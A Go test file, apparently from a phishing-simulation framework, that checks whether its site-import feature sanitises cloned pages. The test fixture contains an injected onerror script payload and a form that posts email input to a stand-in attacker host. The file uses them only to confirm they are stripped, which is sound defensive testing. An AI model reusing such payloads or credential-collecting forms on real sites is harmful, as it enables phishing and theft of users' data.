package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/darkarmy-cyber/darkphish/config"
	"github.com/darkarmy-cyber/darkphish/models"
)

type testContext struct {
	apiKey    string
	config    *config.Config
	apiServer *Server
	admin     models.User
}

func setupTest(t *testing.T) *testContext {
	conf := &config.Config{
		DBName:         "sqlite3",
		DBPath:         ":memory:",
		MigrationsPath: "../../db/db_sqlite3/migrations/",
		Secrets: config.SecretsConfig{
			ActiveKeyID: "TEST",
			Keys: map[string]string{
				"TEST": "0123456789abcdef0123456789abcdef",
			},
		},
	}
	err := models.Setup(conf)
	if err != nil {
		t.Fatalf("Failed creating database: %v", err)
	}
	ctx := &testContext{}
	ctx.config = conf
	// Get the API key to use for these tests
	u, err := models.GetUser(1)
	if err != nil {
		t.Fatalf("error getting admin user: %v", err)
	}
	u.PasswordChangeRequired = false
	if err := models.PutUser(&u); err != nil {
		t.Fatalf("error activating admin user: %v", err)
	}
	_, ctx.apiKey, err = models.CreatePersonalAccessToken(u.Id, "api tests", models.AllowedPATScopes(), time.Now().UTC().Add(24*time.Hour))
	if err != nil {
		t.Fatalf("error creating test personal access token: %v", err)
	}
	ctx.admin = u
	ctx.apiServer = NewServer()
	return ctx
}

func TestSiteImportSanitizesRemoteResources(t *testing.T) {
	originalRenderer := renderImportPageForImport
	renderImportPageForImport = func(context.Context, string) ([]byte, *url.URL, error) {
		return nil, nil, errRenderedImportUnavailable
	}
	t.Cleanup(func() { renderImportPageForImport = originalRenderer })
	ctx := setupTest(t)
	h := `<html><head><base href="https://attacker.example.test/"></head><body><img src="/test.png" onerror="alert(1)"><form action="https://attacker.example.test/collect"><input name="email"></form></body></html>`
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintln(w, h)
	}))
	defer ts.Close()
	response := makeImportRequest(ctx, []string{"127.0.0.1/32", "::1/128"}, ts.URL)
	cs := cloneResponse{}
	err := json.NewDecoder(response.Body).Decode(&cs)
	if err != nil {
		t.Fatalf("error decoding response: %v", err)
	}
	if strings.Contains(cs.HTML, `href="https://attacker.example.test/`) || strings.Contains(cs.HTML, `src="/test.png"`) || strings.Contains(cs.HTML, "onerror") || strings.Contains(cs.HTML, "attacker.example.test/collect") {
		t.Fatal("import retained unsafe remote metadata")
	}
	if strings.Contains(cs.HTML, "<base ") {
		t.Fatal("import retained a remote base element")
	}
	if strings.Contains(cs.HTML, `src="`+ts.URL+`/test.png"`) {
		t.Fatal("import retained an insecure HTTP resource URL")
	}
	if !strings.Contains(cs.HTML, "<form") || !strings.Contains(cs.HTML, `name="email"`) || !strings.Contains(cs.HTML, `action=""`) {
		t.Fatal("import removed the landing-page form")
	}
}
